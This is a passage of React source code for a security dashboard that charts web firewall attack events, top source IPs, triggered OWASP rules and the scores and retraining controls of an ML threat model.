          <div className="metric-icon-wrapper blue"><Globe size={18} /></div>
        </div>
        <div className="metric-value" style={{ color: 'var(--accent-color)' }}><AnimatedNumber value={stats.total_unique_ips} /></div>
        <div className="metric-trend trend-up">
          <span className="trend-arrow">↑</span> <Globe size={12} /> <span>Globally distributed attackers</span>
        </div>
      </div>

      {/* Main Timeline Chart */}
      <div className="chart-card glass-panel" style={{ gridColumn: 'span 8', position: 'relative' }}>
        {showFlash && (
          <div style={{
            position: 'absolute',
            inset: 0,
            background: 'rgba(255, 59, 92, 0.08)',
            border: '2px solid var(--danger-color)',
            boxShadow: 'inset 0 0 20px rgba(255, 59, 92, 0.3)',
            borderRadius: '16px',
            pointerEvents: 'none',
            zIndex: 10,
            transition: 'all 0.1s ease-in-out'
          }} />
        )}
        <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '24px' }}>
          <div className="card-title" style={{ marginBottom: 0 }}>
            <Activity size={18} color="var(--accent-color)" />
            Attack Timeline / Inbound Threats Over Time
          </div>
          <div style={{ display: 'flex', alignItems: 'center', gap: '16px' }}>
            <div className="pulse-container">
              <div className="pulse-dot"></div>
              <span>Live Sync</span>
            </div>
          </div>
        </div>
        <div className="chart-container" style={{ minHeight: '300px' }}>
          <ResponsiveContainer width="100%" height="100%">
            <AreaChart data={timelineData}>
              <defs>
                <linearGradient id="colorAttacks" x1="0" y1="0" x2="0" y2="1">
                  <stop offset="5%" stopColor="var(--danger-color)" stopOpacity={0.4} />
                  <stop offset="95%" stopColor="var(--danger-color)" stopOpacity={0.0} />
                </linearGradient>
              </defs>
              <CartesianGrid strokeDasharray="3 3" stroke="rgba(255,255,255,0.03)" vertical={false} />
              <XAxis dataKey="time" stroke="#a1a1aa" fontSize={11} tickLine={false} axisLine={false} interval="preserveStartEnd" minTickGap={50} />
              <YAxis stroke="#a1a1aa" fontSize={11} tickLine={false} axisLine={false} />
              <RechartsTooltip content={<CustomTimelineTooltip />} />
              <Area type="monotone" dataKey="attacks" name="Triggered Events" stroke="var(--danger-color)" strokeWidth={2} fillOpacity={1} fill="url(#colorAttacks)" />
            </AreaChart>
          </ResponsiveContainer>
        </div>
      </div>

      {/* Severity Distribution RadialBarChart */}
      <div className="chart-card glass-panel" style={{ gridColumn: 'span 4', position: 'relative' }}>
        <div className="card-title">
          <AlertIcon size={18} color="var(--danger-color)" />
          Severity Distribution
        </div>
        <div className="chart-container" style={{ minHeight: '300px', display: 'flex', flexDirection: 'column', justifyContent: 'center', alignItems: 'center', position: 'relative' }}>
          {radialData.length === 0 ? (
            <div style={{ color: '#a1a1aa', fontSize: '13px' }}>No severity data recorded</div>
          ) : (
            <>
              <ResponsiveContainer width="100%" height="70%">
                <RadialBarChart
                  cx="50%"
                  cy="50%"
                  innerRadius="35%"
                  outerRadius="95%"
                  barSize={10}
                  data={radialData}
                  startAngle={180}
                  endAngle={-180}
                >
                  <RadialBar
                    minAngle={15}
                    background={{ fill: 'rgba(255, 255, 255, 0.02)' }}
                    clockWise
                    dataKey="value"
                    cornerRadius={5}
                  />
                  <RechartsTooltip
                    contentStyle={{ backgroundColor: 'rgba(15, 16, 22, 0.95)', border: '1px solid rgba(255,255,255,0.08)', borderRadius: '8px' }}
                    itemStyle={{ color: '#fff' }}
                  />
                </RadialBarChart>
              </ResponsiveContainer>

              {/* Centered label inside the radial rings */}
              <div style={{
                position: 'absolute',
                top: '35%',
                left: '50%',
                transform: 'translate(-50%, -50%)',
                textAlign: 'center',
                pointerEvents: 'none'
              }}>
                <div style={{ fontSize: '24px', fontWeight: '800', color: 'var(--text-primary)', fontFamily: 'var(--font-mono)' }}>
                  {totalSeverityCount}
                </div>
                <div style={{ fontSize: '9px', textTransform: 'uppercase', color: 'var(--text-secondary)', letterSpacing: '1px' }}>
                  TOTAL HITS
                </div>
              </div>
            </>
          )}

          <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '6px 12px', width: '100%', padding: '12px 24px' }}>
            {severityDistribution.map((entry) => (
              <div key={entry.name} style={{ display: 'flex', alignItems: 'center', gap: '6px', fontSize: '11px' }}>
                <div style={{ width: '8px', height: '8px', borderRadius: '50%', backgroundColor: COLORS[entry.name] || '#3b82f6' }}></div>
                <span style={{ color: '#a1a1aa' }}>{entry.name}:</span>
                <span style={{ fontWeight: 600, color: 'var(--text-primary)' }}>{entry.value}</span>
              </div>
            ))}
          </div>
        </div>
      </div>

      {/* Attack Categories Distribution (Premium Donut Chart) */}
      <div className="chart-card glass-panel" style={{ gridColumn: 'span 5' }}>
        <div className="card-title">
          <ShieldAlert size={18} color="#f97316" />
          Attack Vector Distribution
        </div>
        <div className="chart-container" style={{ minHeight: '320px', display: 'flex', flexDirection: 'column', justifyContent: 'center', alignItems: 'center', padding: '8px 16px 16px' }}>
          {attackDistribution.length === 0 ? (
            <div style={{ color: '#a1a1aa', fontSize: '13px' }}>No categories data recorded</div>
          ) : (() => {
            const totalVectors = attackDistribution.reduce((s, d) => s + d.value, 0);
            const activeEntry = activeVectorIndex != null ? attackDistribution[activeVectorIndex] : null;
            const activeColor = activeEntry ? (COLORS[activeEntry.name] || severityColors[activeVectorIndex % severityColors.length]) : null;

            const renderActiveShape = (props) => {
              const { cx, cy, innerRadius, outerRadius, startAngle, endAngle, fill } = props;
              return (
                <g>
                  <path
                    d={`M ${cx},${cy} L ${cx + (outerRadius + 8) * Math.cos(-startAngle * Math.PI / 180)},${cy + (outerRadius + 8) * Math.sin(-startAngle * Math.PI / 180)}`}
                    stroke="none" fill="none"
                  />
                  <Sector
                    cx={cx} cy={cy}
                    innerRadius={innerRadius - 4}
                    outerRadius={outerRadius + 10}
                    startAngle={startAngle}
                    endAngle={endAngle}
                    fill={fill}
                    style={{ filter: `drop-shadow(0 0 12px ${fill}99)` }}
                  />
                  <Sector
                    cx={cx} cy={cy}
                    innerRadius={outerRadius + 14}
                    outerRadius={outerRadius + 17}
                    startAngle={startAngle}
                    endAngle={endAngle}
                    fill={fill}
                    opacity={0.5}
                  />
                </g>
              );
            };

            return (
              <>
                <div style={{ position: 'relative', width: '100%', height: '200px' }}>
                  <ResponsiveContainer width="100%" height="100%">
                    <PieChart>
                      <Pie
                        data={attackDistribution}
                        cx="50%" cy="50%"
                        innerRadius={58} outerRadius={82}
                        paddingAngle={3}
                        dataKey="value"
                        activeIndex={activeVectorIndex}
                        activeShape={renderActiveShape}
                        onMouseEnter={(_, index) => setActiveVectorIndex(index)}
                        onMouseLeave={() => setActiveVectorIndex(null)}
                        strokeWidth={0}
                      >
                        {attackDistribution.map((entry, index) => (
                          <Cell
                            key={`cell-${index}`}
                            fill={COLORS[entry.name] || severityColors[index % severityColors.length]}
                            opacity={activeVectorIndex != null && activeVectorIndex !== index ? 0.45 : 1}
                          />
                        ))}
                      </Pie>
                      <RechartsTooltip
                        contentStyle={{ backgroundColor: 'rgba(9, 9, 11, 0.97)', border: '1px solid rgba(255,255,255,0.1)', borderRadius: '10px', padding: '10px 14px' }}
                        itemStyle={{ color: '#fff', fontWeight: 600, fontSize: '13px' }}
                        formatter={(value, name) => [`${value} events (${((value / totalVectors) * 100).toFixed(1)}%)`, name]}
                      />
                    </PieChart>
                  </ResponsiveContainer>

                  {/* Center label */}
                  <div style={{
                    position: 'absolute', top: '50%', left: '50%',
                    transform: 'translate(-50%, -50%)',
                    textAlign: 'center', pointerEvents: 'none'
                  }}>
                    {activeEntry ? (
                      <>
                        <div style={{ fontSize: '20px', fontWeight: 800, color: activeColor, lineHeight: 1.1, fontFamily: 'var(--font-mono)' }}>
                          {activeEntry.value}
                        </div>
                        <div style={{ fontSize: '9px', color: '#71717a', textTransform: 'uppercase', letterSpacing: '0.8px', marginTop: '2px' }}>
                          {((activeEntry.value / totalVectors) * 100).toFixed(0)}%
                        </div>
                      </>
                    ) : (
                      <>
                        <div style={{ fontSize: '22px', fontWeight: 800, color: '#f4f4f5', lineHeight: 1.1, fontFamily: 'var(--font-mono)' }}>
                          {totalVectors.toLocaleString()}
                        </div>
                        <div style={{ fontSize: '9px', color: '#71717a', textTransform: 'uppercase', letterSpacing: '0.8px', marginTop: '2px' }}>
                          Total Attacks
                        </div>
                      </>
                    )}
                  </div>
                </div>

                {/* Legend grid */}
                <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '6px 16px', width: '100%', padding: '4px 8px 0' }}>
                  {attackDistribution.map((entry, index) => {
                    const color = COLORS[entry.name] || severityColors[index % severityColors.length];
                    const pct = ((entry.value / totalVectors) * 100).toFixed(0);
                    const isActive = activeVectorIndex === index;
                    return (
                      <div
                        key={entry.name}
                        onMouseEnter={() => setActiveVectorIndex(index)}
                        onMouseLeave={() => setActiveVectorIndex(null)}
                        style={{
                          display: 'flex', alignItems: 'center', justifyContent: 'space-between',
                          gap: '6px', fontSize: '11px', cursor: 'pointer',
                          padding: '5px 8px', borderRadius: '7px',
                          background: isActive ? `${color}12` : 'transparent',
                          border: `1px solid ${isActive ? color + '40' : 'transparent'}`,
                          transition: 'all 0.2s ease'
                        }}
                      >
                        <div style={{ display: 'flex', alignItems: 'center', gap: '6px', minWidth: 0 }}>
                          <div style={{
                            width: '8px', height: '8px', borderRadius: '50%', flexShrink: 0,
                            backgroundColor: color,
                            boxShadow: isActive ? `0 0 8px ${color}` : 'none',
                            transition: 'box-shadow 0.2s'
                          }} />
                          <span style={{ color: isActive ? '#e4e4e7' : '#a1a1aa', whiteSpace: 'nowrap', overflow: 'hidden', textOverflow: 'ellipsis', fontWeight: isActive ? 600 : 400 }}>
                            {entry.name}
                          </span>
                        </div>
                        <div style={{ display: 'flex', alignItems: 'center', gap: '4px', flexShrink: 0 }}>
                          <span style={{
                            fontFamily: 'var(--font-mono)', fontSize: '10px', fontWeight: 700,
                            color: color, background: `${color}18`,
                            padding: '1px 6px', borderRadius: '4px', border: `1px solid ${color}30`
                          }}>{pct}%</span>
                        </div>
                      </div>
                    );
                  })}
                </div>
              </>
            );
          })()}
        </div>
      </div>

      {/* Top Attacking IPs List */}
      <div className="chart-card glass-panel" style={{ gridColumn: 'span 4' }}>
        <div className="card-title">
          <Globe size={18} color="var(--accent-color)" />
          Top Threat Origin IPs
        </div>
        <div className="chart-container" style={{ minHeight: '320px', padding: '10px 0' }}>
          <div style={{ display: 'flex', flexDirection: 'column', gap: '10px', width: '100%', height: '100%', justifyContent: 'center' }}>
            {topIPs.length === 0 ? (
              <div style={{ textAlign: 'center', color: '#a1a1aa', fontSize: '13px' }}>No malicious IPs recorded yet.</div>
            ) : (
              topIPs.map((ipObj, index) => {
                const getFlagEmoji = (countryCode) => {
                  if (!countryCode || countryCode === 'Unknown' || countryCode === 'Internal') return '🌐';
                  const codePoints = countryCode
                    .toUpperCase()
                    .split('')
                    .map(char => 127397 + char.charCodeAt(0));
                  try {
                    return String.fromCodePoint(...codePoints);
                  } catch (e) {
                    return '🌐';
                  }
                };

                return (
                  <div
                    key={ipObj.ip || index}
                    className="ip-row-glow"
                    style={{
                      display: 'flex',
                      flexDirection: 'column',
                      gap: '6px',
                      padding: '8px 12px',
                      borderRadius: '8px',
                      transition: 'all 0.2s ease-in-out',
                      background: 'rgba(255, 255, 255, 0.01)',
                      border: '1px solid rgba(255, 255, 255, 0.02)'
                    }}
                  >
                    <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', fontSize: '12px' }}>
                      <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
                        <span style={{ color: '#a1a1aa', fontWeight: 600, fontSize: '11px', width: '16px' }}>#{index + 1}</span>
                        <span style={{ fontSize: '14px' }} title={ipObj.country || 'Unknown'}>
                          {getFlagEmoji(ipObj.country)}
                        </span>
                        <span style={{ fontFamily: 'var(--font-mono)', color: 'var(--accent-color)', fontWeight: 600 }}>{ipObj.ip}</span>
                        {ipObj.abuse_score > 0 && (
                          <span style={{
                            fontSize: '9px',
                            fontWeight: 'bold',
                            color: 'var(--danger-color)',
                            border: '1px solid rgba(255, 59, 92, 0.3)',
                            background: 'rgba(255, 59, 92, 0.1)',
                            padding: '1px 5px',
                            borderRadius: '3px',
                            fontFamily: 'var(--font-mono)'
                          }}>
                            CONF: {ipObj.abuse_score}%
                          </span>
                        )}
                      </div>
                      <span style={{ fontWeight: 700, color: 'var(--danger-color)', fontFamily: 'var(--font-mono)' }}>{ipObj.count} hits</span>
                    </div>
                    <div style={{ width: '100%', height: '5px', background: 'rgba(255,255,255,0.03)', borderRadius: '3px', overflow: 'hidden', border: '1px solid rgba(255,255,255,0.05)' }}>
                      <div style={{
                        width: `${Math.min((ipObj.count / (topIPs[0]?.count || 1)) * 100, 100)}%`,
                        height: '100%',
                        background: 'linear-gradient(90deg, var(--accent-color), var(--danger-color))',
                        borderRadius: '3px',
                        boxShadow: '0 0 8px rgba(0, 212, 255, 0.4)'
                      }}></div>
                    </div>
                  </div>
                );
              })
            )}
          </div>
        </div>
      </div>

      {/* Most Triggered OWASP Rules */}
      <div className="chart-card glass-panel" style={{ gridColumn: 'span 3' }}>
        <div className="card-title">
          <ShieldAlert size={18} color="var(--danger-color)" />
          Most Active OWASP Rules
        </div>
        <div className="chart-container" style={{ minHeight: '320px' }}>
          <div className="rules-triggered-list" style={{ height: '100%', justifyContent: 'center', display: 'flex', flexDirection: 'column' }}>
            {topRules.length === 0 ? (
              <div style={{ textAlign: 'center', color: '#a1a1aa', fontSize: '13px' }}>No rules triggered yet.</div>
            ) : (
              topRules.map((ruleObj) => (
                <div key={ruleObj.rule_id} className="rule-triggered-item">
                  <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
                    <span className="rule-badge">{ruleObj.rule_id}</span>
                    <span style={{ fontSize: '12px', color: '#a1a1aa' }}>OWASP CRS</span>
                  </div>
                  <span style={{ fontWeight: 600, fontSize: '13px', color: '#fde047' }}>{ruleObj.count} hits</span>
                </div>
              ))
            )}
          </div>
        </div>
      </div>
    </motion.div>
  );
}

function MLAnalytics() {
  const [stats, setStats] = useState({
    total_evaluations: 0,
    decision_breakdown: { allow: 0, block: 0, rate_limit: 0, log: 0 },
    avg_threat_score: 0.0,
    top_anomalous_uris: [],
    top_anomalous_ips: []
  });
  const [logs, setLogs] = useState([]);
  const [totalLogs, setTotalLogs] = useState(0);
  const [page, setPage] = useState(1);
  const [size] = useState(10);
  const [timeline, setTimeline] = useState([]);
  const [loading, setLoading] = useState(true);
  const [filterDecision, setFilterDecision] = useState('');
  const [searchQuery, setSearchQuery] = useState('');
  const [selectedLog, setSelectedLog] = useState(null);
  const [refreshInterval, setRefreshInterval] = useState(3000);
  const [autoRefresh, setAutoRefresh] = useState(true);
  const [copied, setCopied] = useState(false);
  const [correlatedLog, setCorrelatedLog] = useState(null);
  const [loadingCorrelated, setLoadingCorrelated] = useState(false);
  const [modalActiveTab, setModalActiveTab] = useState('scores');

  // Model Management & Retraining States
  const [activeSubTab, setActiveSubTab] = useState('analytics'); // 'analytics', 'management'
  const [modelInfo, setModelInfo] = useState(null);
  const [retrainStatus, setRetrainStatus] = useState({ status: 'idle', logs: '' });
  const [backups, setBackups] = useState([]);
  const [featureImportance, setFeatureImportance] = useState([]);
  const [loadingManagement, setLoadingManagement] = useState(false);
  const [triggeringRetrain, setTriggeringRetrain] = useState(false);
  const [rollingBack, setRollingBack] = useState(false);

  const fetchManagementData = async () => {
    setLoadingManagement(true);
    try {
      const info = await getMLModelInfo();
      if (info && !info.error) setModelInfo(info);

      const status = await getMLRetrainStatus();
      if (status && !status.error) setRetrainStatus(status);

      const bks = await getMLBackups();
      if (bks && !bks.error) setBackups(bks.data || []);

      const imp = await getMLFeatureImportance();
      if (imp && !imp.error) setFeatureImportance(imp.data || []);
    } catch (err) {
      console.error("Failed to load ML management data:", err);
    } finally {
      setLoadingManagement(false);
    }
  };

  useEffect(() => {
    let interval;
    if (activeSubTab === 'management') {
      fetchManagementData();
      interval = setInterval(async () => {
        try {
          const status = await getMLRetrainStatus();
          if (status && !status.error) {
            setRetrainStatus(status);
            if (status.status !== 'running') {
              const info = await getMLModelInfo();
              if (info && !info.error) setModelInfo(info);
              const bks = await getMLBackups();
              if (bks && !bks.error) setBackups(bks.data || []);
              const imp = await getMLFeatureImportance();
              if (imp && !imp.error) setFeatureImportance(imp.data || []);
            }
          }
        } catch (err) {
          console.warn("Error polling retrain status:", err);
        }
      }, 3000);
    }
    return () => clearInterval(interval);
  }, [activeSubTab]);

  const handleTriggerRetrain = async () => {
    if (window.confirm("Are you sure you want to trigger ML model retraining? This will run collect_data and rebuild XGBoost and Isolation Forest classifiers using active traffic db records.")) {
      setTriggeringRetrain(true);
      try {
        const res = await triggerMLRetrain();
        if (res.status === 'success') {
          setRetrainStatus(prev => ({ ...prev, status: 'running' }));
        } else {
          alert("Failed to start retraining: " + res.message);
        }
      } catch (err) {
        alert("Retrain error: " + err.message);
      } finally {
        setTriggeringRetrain(false);
      }
    }
  };

  const handleRollback = async (timestamp) => {
    if (window.confirm(`Are you sure you want to roll back both model weights to version backup ${timestamp}?`)) {
      setRollingBack(true);
      try {
        const res = await rollbackMLModel(timestamp);
        if (res.status === 'success') {
          alert(res.message);
          const info = await getMLModelInfo();
          if (info && !info.error) setModelInfo(info);
          const bks = await getMLBackups();
          if (bks && !bks.error) setBackups(bks.data || []);
        } else {
          alert("Rollback failed: " + res.message);
        }
      } catch (err) {
        alert("Rollback error: " + err.message);
      } finally {
        setRollingBack(false);
      }
    }
  };

  useEffect(() => {
    if (selectedLog && selectedLog.unique_id) {
      setLoadingCorrelated(true);
      setModalActiveTab('scores');
      getLogById(selectedLog.unique_id)
        .then(data => {
          if (data && !data.error) {
            setCorrelatedLog(data);
          } else {
            setCorrelatedLog(null);
          }
        })
        .catch(err => {
          console.warn("No correlated CyberSentinel Engine audit log found:", err);
          setCorrelatedLog(null);
        })
        .finally(() => {
          setLoadingCorrelated(false);
        });
    } else {
      setCorrelatedLog(null);
      setModalActiveTab('scores');
    }
  }, [selectedLog]);

  const [copiedRaw, setCopiedRaw] = useState(false);

  useEffect(() => {
    if (copied) {
      const t = setTimeout(() => setCopied(false), 2000);
      return () => clearTimeout(t);
    }
  }, [copied]);

  useEffect(() => {
    if (copiedRaw) {
      const t = setTimeout(() => setCopiedRaw(false), 2000);
      return () => clearTimeout(t);
    }
  }, [copiedRaw]);

  const handleCopy = () => {
    if (!selectedLog) return;
    const textToCopy = JSON.stringify(selectedLog, null, 2);

    if (navigator.clipboard && window.isSecureContext) {
      navigator.clipboard.writeText(textToCopy)
        .then(() => setCopied(true))
        .catch(err => console.error("Copy failed", err));
    } else {
      try {
        const textArea = document.createElement("textarea");
        textArea.value = textToCopy;
        textArea.style.position = "fixed";
        textArea.style.left = "-999999px";
        document.body.appendChild(textArea);
        textArea.focus();
        textArea.select();
        const successful = document.execCommand('copy');
        document.body.removeChild(textArea);
        if (successful) setCopied(true);
      } catch (err) {
        console.error("Fallback copy error", err);
      }
    }
  };

  const handleCopyRaw = () => {
    if (!correlatedLog) return;
    const raw = correlatedLog.raw_log || correlatedLog;
    const textToCopy = JSON.stringify(raw, null, 2);

    if (navigator.clipboard && window.isSecureContext) {
      navigator.clipboard.writeText(textToCopy)
        .then(() => setCopiedRaw(true))
        .catch(err => console.error("Copy failed", err));
    } else {
      try {
        const textArea = document.createElement("textarea");
        textArea.value = textToCopy;
        textArea.style.position = "fixed";
        textArea.style.left = "-999999px";
        document.body.appendChild(textArea);
        textArea.focus();
        textArea.select();
        const successful = document.execCommand('copy');
        document.body.removeChild(textArea);
        if (successful) setCopiedRaw(true);
      } catch (err) {
        console.error("Fallback copy error", err);
      }
    }
  };

  const fetchMLData = async () => {
    try {
      const statsData = await getMLStats();
      if (statsData && !statsData.error) {
        setStats(statsData);
      }

      const filters = {};
      if (filterDecision) filters.decision = filterDecision;
      if (searchQuery) filters.search = searchQuery;

      const logsData = await getMLLogs(page, size, filters);
      if (logsData && !logsData.error) {
        setLogs(logsData.data || []);
        setTotalLogs(logsData.total || 0);
      }

      const timelineData = await getMLTimeline();
      if (timelineData && !timelineData.error) {
        setTimeline(timelineData.data || []);
      }
    } catch (err) {
      console.error("Error fetching ML analytics data:", err);
    } finally {
      setLoading(false);
    }
  };

  useEffect(() => {
    const timer = setTimeout(() => {
      fetchMLData();
    }, 0);
    return () => clearTimeout(timer);
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [page, filterDecision, searchQuery]);

  useEffect(() => {
    if (!autoRefresh) return;
    const interval = setInterval(() => {
      fetchMLData();
    }, refreshInterval);
    return () => clearInterval(interval);
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [autoRefresh, refreshInterval, page, filterDecision, searchQuery]);

  const decisionColors = {
    allow: '#10b981',
    log: '#3b82f6',
    rate_limit: '#f59e0b',
    block: '#ef4444'
  };

  const pieData = Object.entries(stats.decision_breakdown).map(([name, value]) => ({
    name: name.toUpperCase().replace('_', ' '),
    value,
    color: decisionColors[name] || '#6b7280'
  })).filter(item => item.value > 0);

  const hasPieData = pieData.length > 0;
  const displayPieData = hasPieData ? pieData : [
    { name: 'NO DATA', value: 1, color: '#4b5563' }
  ];

  return (
    <motion.div
      className="dashboard-grid animate-fade-in"
      initial={{ opacity: 0, y: 10 }}
      animate={{ opacity: 1, y: 0 }}
      transition={{ duration: 0.4 }}
    >
      {/* Dynamic Controls Header inside the grid to span full width */}
      <div className="glass-panel" style={{ gridColumn: 'span 12', padding: '16px 24px', display: 'flex', justifyContent: 'space-between', alignItems: 'center', flexWrap: 'wrap', gap: '16px' }}>
        <div style={{ display: 'flex', alignItems: 'center', gap: '12px' }}>
          <Brain size={24} color="#6366f1" style={{ filter: 'drop-shadow(0 0 8px rgba(99, 102, 241, 0.5))' }} />
          <div>
            <span style={{ fontSize: '13px', color: 'var(--text-secondary)' }}>Status: </span>
            <strong style={{ fontSize: '13px', color: 'var(--success-color)' }}>Predictive Protection Shields Active</strong>
          </div>
        </div>

        <div style={{ display: 'flex', alignItems: 'center', gap: '12px' }}>
          <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
            <span style={{ fontSize: '13px', color: 'var(--text-secondary)' }}>Auto Refresh:</span>
            <input
              type="checkbox"
              checked={autoRefresh}
              onChange={(e) => setAutoRefresh(e.target.checked)}
              style={{ cursor: 'pointer', width: '16px', height: '16px' }}
            />
          </div>

          <select
            value={refreshInterval}
            onChange={(e) => setRefreshInterval(Number(e.target.value))}
            disabled={!autoRefresh}
            className="filter-select"
            style={{ padding: '6px 12px' }}
          >
            <option value={1000}>1s Refresh</option>
            <option value={3000}>3s Refresh</option>
            <option value={5000}>5s Refresh</option>
            <option value={10000}>10s Refresh</option>
          </select>

          <button
            className="modal-btn primary"
            onClick={fetchMLData}
            style={{ padding: '6px 14px', borderRadius: '8px' }}
          >
            <Activity size={14} /> Force Sync
          </button>
        </div>
      </div>

      {/* Sub-tab selection menu */}
      <div style={{ display: 'flex', gap: '10px', gridColumn: 'span 12', borderBottom: '1px solid var(--border-color)', paddingBottom: '8px' }}>
        <button 
          className={`subtab-btn ${activeSubTab === 'analytics' ? 'active' : ''}`}
          onClick={() => setActiveSubTab('analytics')}
          style={{ padding: '6px 16px', fontSize: '13px', border: 'none', background: 'none', cursor: 'pointer', color: activeSubTab === 'analytics' ? 'var(--accent-color)' : 'var(--text-secondary)', borderBottom: activeSubTab === 'analytics' ? '2px solid var(--accent-color)' : 'none', fontWeight: 600 }}
        >
          Analytics Telemetry
        </button>
        <button 
          className={`subtab-btn ${activeSubTab === 'management' ? 'active' : ''}`}
          onClick={() => setActiveSubTab('management')}
          style={{ padding: '6px 16px', fontSize: '13px', border: 'none', background: 'none', cursor: 'pointer', color: activeSubTab === 'management' ? 'var(--accent-color)' : 'var(--text-secondary)', borderBottom: activeSubTab === 'management' ? '2px solid var(--accent-color)' : 'none', fontWeight: 600 }}
        >
          Model Control & Retraining
        </button>
      </div>

      {activeSubTab === 'analytics' ? (
        <>
          {/* Metric Cards Grid */}
          <div className="metric-card glass-panel" style={{ gridColumn: 'span 3' }}>
            <div className="metric-header">
              <span>AI Evaluations</span>
              <div className="metric-icon-wrapper blue"><Brain size={18} /></div>
            </div>
            <div className="metric-value">{stats.total_evaluations.toLocaleString()}</div>
            <div className="metric-trend trend-down">
              <Clock size={12} /> <span>Real-time capture</span>
            </div>
          </div>

          <div className="metric-card glass-panel" style={{ gridColumn: 'span 3' }}>
            <div className="metric-header">
              <span>Avg Threat Score</span>
              <div className="metric-icon-wrapper blue" style={{ color: 'var(--accent-color)', background: 'var(--accent-bg)' }}><Activity size={18} /></div>
            </div>
            <div className="metric-value" style={{ color: 'var(--accent-color)' }}>{(stats.avg_threat_score * 100).toFixed(1)}%</div>
            <div className="metric-trend trend-down">
              <span>Overall anomaly ratio</span>
            </div>
          </div>

          <div className="metric-card glass-panel" style={{ gridColumn: 'span 3' }}>
            <div className="metric-header">
              <span>Blocks Executed</span>
              <div className="metric-icon-wrapper red"><ShieldAlert size={18} /></div>
            </div>
            <div className="metric-value" style={{ color: 'var(--danger-color)' }}>{stats.decision_breakdown.block.toLocaleString()}</div>
            <div className="metric-trend trend-up">
              <span>
                {stats.total_evaluations > 0
                  ? ((stats.decision_breakdown.block / stats.total_evaluations) * 100).toFixed(1)
                  : 0}% block rate
              </span>
            </div>
          </div>

          <div className="metric-card glass-panel" style={{ gridColumn: 'span 3' }}>
            <div className="metric-header">
              <span>Rate Limited</span>
              <div className="metric-icon-wrapper orange"><Lock size={18} /></div>
            </div>
            <div className="metric-value" style={{ color: 'var(--warning-color)' }}>{stats.decision_breakdown.rate_limit.toLocaleString()}</div>
            <div className="metric-trend trend-up">
              <span>
                {stats.total_evaluations > 0
                  ? ((stats.decision_breakdown.rate_limit / stats.total_evaluations) * 100).toFixed(1)
                  : 0}% rate limits
              </span>
            </div>
          </div>

          {/* Decision Threshold Banner */}
          <div className="chart-card glass-panel" style={{ gridColumn: 'span 12', padding: '24px' }}>
            <div className="card-title" style={{ marginBottom: '16px' }}>
              <SettingsIcon size={18} color="var(--accent-color)" />
              Hybrid Decision Matrix Routing Thresholds
            </div>

            <div style={{ display: 'flex', width: '100%', height: '32px', borderRadius: '8px', overflow: 'hidden', background: 'rgba(255,255,255,0.02)', border: '1px solid var(--border-color)', marginBottom: '16px', fontSize: '12px', fontWeight: 600, textAlign: 'center', lineHeight: '32px' }}>
              <div style={{ width: '40%', background: 'rgba(16, 185, 129, 0.15)', borderRight: '1px solid rgba(16, 185, 129, 0.3)', color: 'var(--success-color)' }}>ALLOW (Score &lt; 40%)</div>
              <div style={{ width: '30%', background: 'rgba(99, 102, 241, 0.15)', borderRight: '1px solid rgba(99, 102, 241, 0.3)', color: 'var(--accent-color)' }}>LOG (40% - 70%)</div>
              <div style={{ width: '15%', background: 'rgba(245, 158, 11, 0.15)', borderRight: '1px solid rgba(245, 158, 11, 0.3)', color: 'var(--warning-color)' }}>LIMIT (70% - 85%)</div>
              <div style={{ width: '15%', background: 'rgba(244, 63, 94, 0.15)', color: 'var(--danger-color)' }}>BLOCK (&gt;= 85%)</div>
            </div>

            <div style={{ display: 'flex', justifyContent: 'space-between', color: 'var(--text-secondary)', fontSize: '13px', flexWrap: 'wrap', gap: '8px' }}>
              <span>ℹ️ Scores combine CRS signatures (50%), XGBoost classification (30%), Isolation Forest novelty (20%), and Redis reputation.</span>
              <span style={{ color: 'var(--accent-color)', fontWeight: 500 }}>Engine: Active (FastAPI Daemon)</span>
            </div>
          </div>

          {/* Visual Analytics Row */}
          {/* Timeline Chart */}
          <div className="chart-card glass-panel" style={{ gridColumn: 'span 8' }}>
            <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '24px' }}>
              <div className="card-title" style={{ marginBottom: 0 }}>
                <Activity size={18} color="var(--accent-color)" />
                Threat Score Timeline Trends
              </div>
              <div className="pulse-container">
                <div className="pulse-dot"></div>
                <span>Live Sync</span>
              </div>
            </div>

            <div className="chart-container" style={{ minHeight: '280px' }}>
              {timeline.length > 0 ? (
                <ResponsiveContainer width="100%" height="100%">
                  <ComposedChart data={timeline} margin={{ top: 10, right: 15, left: -15, bottom: 0 }}>
                    <defs>
                      <linearGradient id="mlThreatScoreGrad" x1="0" y1="0" x2="0" y2="1">
                        <stop offset="5%" stopColor="var(--danger-color)" stopOpacity={0.35} />
                        <stop offset="95%" stopColor="var(--danger-color)" stopOpacity={0.0} />
                      </linearGradient>
                    </defs>
                    <CartesianGrid strokeDasharray="3 3" stroke="rgba(255,255,255,0.05)" vertical={false} />
                    <XAxis
                      dataKey="time_bucket"
                      tickFormatter={(val) => {
                        try {
                          return val.split(' ')[1].slice(0, 5); // Display HH:MM
                        } catch {
                          return val;
                        }
                      }}
                      stroke="var(--text-secondary)"
                      fontSize={11}
                      tickLine={false}
                      axisLine={false}
                      interval="preserveStartEnd"
                      minTickGap={50}
                    />
                    {/* Left YAxis: Threat Score */}
                    <YAxis
                      yAxisId="left"
                      domain={[0, 1]}
                      tickFormatter={(val) => `${(val * 100).toFixed(0)}%`}
                      stroke="var(--text-secondary)"
                      fontSize={11}
                      tickLine={false}
                      axisLine={false}
                    />
                    {/* Right YAxis: Request Count */}
                    <YAxis
                      yAxisId="right"
                      orientation="right"
                      stroke="var(--text-secondary)"
                      fontSize={11}
                      tickLine={false}
                      axisLine={false}
                      allowDecimals={false}
                    />
                    <RechartsTooltip
                      contentStyle={{
                        background: 'var(--bg-secondary)',
                        border: '1px solid var(--border-color)',
                        borderRadius: '12px',
                        color: 'var(--text-primary)',
                        fontFamily: 'inherit',
                        boxShadow: '0 10px 25px rgba(0,0,0,0.5)'
                      }}
                      labelFormatter={(label) => `Time: ${label}`}
                      formatter={(value, name) => [
